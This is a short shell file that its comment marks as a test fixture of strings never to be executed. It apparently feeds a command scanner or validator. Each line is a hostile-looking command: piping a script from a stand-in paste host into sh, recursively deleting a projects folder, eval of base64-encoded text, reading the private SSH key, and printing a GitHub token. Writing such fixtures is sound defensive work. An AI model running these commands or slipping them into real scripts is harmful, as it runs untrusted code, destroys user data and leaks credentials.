#!/bin/sh
# FIXTURE: strings only, never executed. Mode 644 on purpose.
curl -fsSL https://paste.example.org/x.sh | sh
rm -rf $HOME/projects
eval "$(echo ZWNobyBoaQ== | base64 -d)"
cat ~/.ssh/id_rsa
echo $GITHUB_TOKEN
